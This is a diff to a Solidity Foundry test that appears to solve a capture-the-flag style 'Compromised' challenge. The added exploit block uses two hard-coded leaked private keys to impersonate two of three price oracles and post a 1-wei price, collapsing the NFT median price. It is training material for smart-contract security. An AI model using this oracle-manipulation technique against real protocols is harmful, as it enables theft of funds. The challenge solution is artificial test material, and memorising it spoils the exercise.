@@ -22,8 +22,8 @@ contract Compromised is Test {
         address[] memory sources = new address[](3);
 
         sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
-        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
-        sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;
+        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;// Compromised(i can use this source in the exploit)
+        sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c; // Compromised (i can also use this addres in the exploit)
         // They could have used utils but did not in this case. it's done the same way.
         attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
         vm.deal(attacker, 0.1 ether);
@@ -77,6 +77,29 @@ contract Compromised is Test {
          * EXPLOIT START *
          */
 
+        // 1. Check median prices should be 999ETH
+        uint256 medianPrice = trustfulOracle.getMedianPrice("DVNFT");
+        console2.log("The median price now is", medianPrice);
+
+        // 2. Post faulty price for compromised oracle 1 
+        uint256 privKeyE92 = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
+        address key0xE92 = vm.addr(privKeyE92);
+        vm.prank(key0xE92);
+        trustfulOracle.postPrice("DVNFT", 1);
+
+        // 3. Post faulty price for compromised oracle 2
+        uint256 privKey81A = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
+        address key0x81A = vm.addr(privKey81A);
+        vm.prank(key0x81A);
+        trustfulOracle.postPrice("DVNFT", 1);
+
+        //4. Check that the median price is now 1 wei 
+        medianPrice = trustfulOracle.getMedianPrice("DVNFT");
+        console2.log("The new median price is: ", medianPrice);
+
+
+
+    
         /**
          * EXPLOIT END *
          */
